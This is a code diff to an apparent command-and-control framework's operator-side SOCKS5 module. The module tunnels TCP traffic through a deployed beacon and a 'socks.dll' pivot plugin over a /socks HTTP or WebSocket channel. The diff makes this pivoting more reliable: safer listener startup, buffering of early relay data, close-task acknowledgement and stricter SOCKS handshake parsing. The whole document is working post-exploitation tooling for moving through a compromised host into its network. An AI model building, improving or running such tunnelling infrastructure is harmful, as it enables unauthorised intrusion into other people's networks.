@@ -1,9 +1,12 @@
 """
-SOCKS5 listener on the operator host; TCP is relayed through the beacon.
+SOCKS5 listener on the operator host; TCP is relayed through a pivot plugin.
 
-Agent transport (main /cmd beacon unchanged):
-  - WebSocket GET /socks?... with Upgrade (push tasks, low latency) when supported
-  - HTTP GET/POST /socks (poll fallback)
+This module owns the operator-side listener, task queue, and /socks protocol.
+The agent-side relay implementation is delivered separately as a pivot plugin;
+the main beacon only reports the lifecycle flag. Current plugins use HTTP poll:
+
+  - HTTP GET/POST /socks (current plugin transport)
+  - WebSocket GET /socks?... with Upgrade (available to compatible plugins)
 """
 
 from __future__ import annotations
@@ -19,6 +22,7 @@ from typing import Any
 
 DEFAULT_SOCKS_PORT = 1080
 DEFAULT_BIND_HOST = "127.0.0.1"
+GO_SOCKS_PLUGIN_FILE = "socks.dll"
 SOCKS_CHUNK = 16384
 CONNECT_TIMEOUT = 45.0
 RELAY_IDLE_TIMEOUT = 300.0
@@ -61,17 +65,37 @@ class SessionSocksBridge:
         with self.lock:
             if self._running:
                 return
-            self._running = True
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind((self.bind_host, self.port))
-        sock.listen(64)
-        sock.settimeout(1.0)
-        self._listener_sock = sock
-        self._accept_thread = threading.Thread(
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self.bind_host, self.port))
+            sock.listen(64)
+            sock.settimeout(1.0)
+        except Exception:
+            sock.close()
+            raise
+
+        accept_thread = threading.Thread(
             target=self._accept_loop, name=f"socks-{self.session_id[:8]}", daemon=True
         )
-        self._accept_thread.start()
+        with self.lock:
+            if self._running:
+                sock.close()
+                return
+            self._listener_sock = sock
+            self._accept_thread = accept_thread
+            self._running = True
+        try:
+            accept_thread.start()
+        except Exception:
+            with self.lock:
+                self._running = False
+                if self._listener_sock is sock:
+                    self._listener_sock = None
+                if self._accept_thread is accept_thread:
+                    self._accept_thread = None
+            sock.close()
+            raise
         self.log(
             f"SOCKS5 listening on {self.bind_host}:{self.port} (session {self.session_id[:8]})",
             "SUCCESS",
@@ -194,6 +218,7 @@ class SessionSocksBridge:
         with self.lock:
             outbound: list[dict[str, Any]] = []
             keep: deque[dict[str, Any]] = deque()
+            deferred_sends: deque[dict[str, Any]] = deque()
             send_count = 0
             for task in self.task_queue:
                 if task.get("op") == "send":
@@ -201,11 +226,16 @@ class SessionSocksBridge:
                         outbound.append(task)
                         send_count += 1
                     else:
-                        keep.append(task)
+                        deferred_sends.append(task)
+                elif task.get("op") == "close":
+                    # Close is retained until the agent acknowledges it. This
+                    # lets a later poll recover when the delivery response was
+                    # lost in transit.
+                    keep.append(task)
                 else:
                     keep.append(task)
-            self.task_queue = keep
-            # connect/close before send so the agent opens TCP before writing payload
+            self.task_queue = deque([*keep, *deferred_sends])
+            # Persistent control tasks precede the current send batch.
             return list(keep) + outbound
 
     def fetch_tasks_for_pull(self) -> list[dict[str, Any]]:
@@ -246,7 +276,11 @@ class SessionSocksBridge:
                 self._drop_tasks(cid, "connect")
                 with self.lock:
                     if cid not in self.tunnels:
-                        self.tunnels[cid] = {"id": cid, "client_lock": threading.Lock()}
+                        self.tunnels[cid] = {
+                            "id": cid,
+                            "client_lock": threading.Lock(),
+                            "pending_data": deque(),
+                        }
                     ev = self.connect_events.get(cid)
                 if ev:
                     ev.set()
@@ -274,6 +308,10 @@ class SessionSocksBridge:
                 if tunnel and payload:
                     sock = tunnel.get("client")
                     if not sock:
+                        with self.lock:
+                            current = self.tunnels.get(cid)
+                            if current is tunnel and not current.get("client"):
+                                current.setdefault("pending_data", deque()).append(payload)
                         continue
                     client_lock = tunnel.get("client_lock")
                     try:
@@ -287,6 +325,7 @@ class SessionSocksBridge:
             elif op in ("closed", "close"):
                 self._drop_tasks(cid, "connect")
                 self._drop_tasks(cid, "send")
+                self._drop_tasks(cid, "close")
                 with self.lock:
                     self._pending_sends.pop(cid, None)
                     tunnel = self.tunnels.pop(cid, None)
@@ -296,6 +335,23 @@ class SessionSocksBridge:
     def _close_tunnel(self, tunnel: dict[str, Any], *, notify_client: bool = True) -> None:
         sock = tunnel.get("client")
         client_lock = tunnel.get("client_lock")
+        cid = tunnel.get("id")
+
+        with self.lock:
+            if cid and self.tunnels.get(cid) is tunnel:
+                self.tunnels.pop(cid, None)
+            if cid:
+                self._pending_sends.pop(cid, None)
+                self.task_queue = deque(
+                    task
+                    for task in self.task_queue
+                    if not (
+                        task.get("id") == cid
+                        and task.get("op") in ("connect", "send", "close")
+                    )
+                )
+                if notify_client and self._running:
+                    self.task_queue.append({"op": "close", "id": cid})
 
         def _shutdown_client() -> None:
             if not sock:
@@ -315,10 +371,36 @@ class SessionSocksBridge:
                     _shutdown_client()
             else:
                 _shutdown_client()
-        if notify_client:
-            cid = tunnel.get("id")
-            if cid:
-                self._enqueue_task({"op": "close", "id": cid})
+
+    def _attach_client(self, tunnel: dict[str, Any], client_sock: socket.socket) -> bool:
+        """Attach the local client and flush data received before the SOCKS reply."""
+        client_lock = tunnel.get("client_lock")
+        pending: list[bytes] = []
+        failed = False
+        with self.lock:
+            if not self._running or self.tunnels.get(tunnel.get("id")) is not tunnel:
+                return False
+            # Keep the client absent while flushing the buffered data. This makes
+            # concurrent agent responses append to the same FIFO instead of
+            # overtaking the first bytes received from the remote target.
+            pending_queue = tunnel.setdefault("pending_data", deque())
+            pending = list(pending_queue)
+            pending_queue.clear()
+            try:
+                if client_lock:
+                    with client_lock:
+                        for payload in pending:
+                            client_sock.sendall(payload)
+                else:
+                    for payload in pending:
+                        client_sock.sendall(payload)
+                tunnel["client"] = client_sock
+            except OSError:
+                failed = True
+        if failed:
+            self._close_tunnel(tunnel)
+            return False
+        return True
 
     def _wait_connect(self, conn_id: str) -> bool:
         with self.lock:
@@ -366,8 +448,8 @@ class SessionSocksBridge:
             if not self._socks5_reply(client_sock, rep=0x00):
                 self._close_tunnel(tunnel)
                 return
-            tunnel.setdefault("client_lock", threading.Lock())
-            tunnel["client"] = client_sock
+            if not self._attach_client(tunnel, client_sock):
+                return
             self._relay_local_to_remote(tunnel)
         except Exception as exc:
             self.log(f"SOCKS client error: {exc}", "ERROR")
@@ -409,46 +491,60 @@ class SessionSocksBridge:
                 self._close_tunnel(tunnel)
 
     @staticmethod
-    def _socks5_handshake(client_sock: socket.socket) -> bool:
-        header = client_sock.recv(2)
-        if len(header) < 2 or header[0] != 0x05:
+    def _read_exact(client_sock: socket.socket, size: int) -> bytes | None:
+        """Read exactly ``size`` bytes, tolerating normal TCP fragmentation."""
+        data = bytearray()
+        while len(data) < size:
+            chunk = client_sock.recv(size - len(data))
+            if not chunk:
+                return None
+            data.extend(chunk)
+        return bytes(data)
+
+    @classmethod
+    def _socks5_handshake(cls, client_sock: socket.socket) -> bool:
+        header = cls._read_exact(client_sock, 2)
+        if header is None or header[0] != 0x05:
             return False
         nmethods = header[1]
-        methods = client_sock.recv(nmethods)
-        if len(methods) < nmethods:
+        methods = cls._read_exact(client_sock, nmethods)
+        if methods is None:
+            return False
+        if 0x00 not in methods:
+            client_sock.sendall(b"\x05\xff")
             return False
         client_sock.sendall(b"\x05\x00")
         return True
 
-    @staticmethod
-    def _socks5_read_request(client_sock: socket.socket) -> tuple[str | None, int | None]:
-        req = client_sock.recv(4)
-        if len(req) < 4 or req[0] != 0x05 or req[1] != 0x01:
+    @classmethod
+    def _socks5_read_request(cls, client_sock: socket.socket) -> tuple[str | None, int | None]:
+        req = cls._read_exact(client_sock, 4)
+        if req is None or len(req) < 4 or req[0] != 0x05 or req[1] != 0x01:
             return None, None
         atyp = req[3]
         if atyp == 0x01:
-            raw = client_sock.recv(4)
-            if len(raw) < 4:
+            raw = cls._read_exact(client_sock, 4)
+            if raw is None:
                 return None, None
             host = socket.inet_ntoa(raw)
         elif atyp == 0x03:
-            n = client_sock.recv(1)
-            if not n:
+            n = cls._read_exact(client_sock, 1)
+            if n is None:
                 return None, None
             host_len = n[0]
-            host_b = client_sock.recv(host_len)
-            if len(host_b) < host_len:
+            host_b = cls._read_exact(client_sock, host_len)
+            if host_b is None:
                 return None, None
             host = host_b.decode("utf-8", errors="replace")
         elif atyp == 0x04:
-            raw = client_sock.recv(16)
-            if len(raw) < 16:
+            raw = cls._read_exact(client_sock, 16)
+            if raw is None:
                 return None, None
             host = socket.inet_ntop(socket.AF_INET6, raw)
         else:
             return None, None
-        port_b = client_sock.recv(2)
-        if len(port_b) < 2:
+        port_b = cls._read_exact(client_sock, 2)
+        if port_b is None:
             return None, None
         port = struct.unpack("!H", port_b)[0]
         return host, port
@@ -478,7 +574,7 @@ class SocksManager:
 
     def start(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> SessionSocksBridge:
         with self.lock:
-            existing = self.bridges.get(session_id)
+            existing = self.bridges.pop(session_id, None)
             if existing:
                 existing.stop()
             bridge = SessionSocksBridge(
@@ -487,9 +583,14 @@ class SocksManager:
                 port,
                 on_log=lambda m, lvl="INFO": self._log(m, lvl),
             )
+            try:
+                bridge.start()
+            except Exception:
+                # A failed bind must not leave an unusable bridge registered.
+                bridge.stop()
+                raise
             self.bridges[session_id] = bridge
-        bridge.start()
-        return bridge
+            return bridge
 
     def stop(self, session_id: str) -> bool:
         with self.lock:
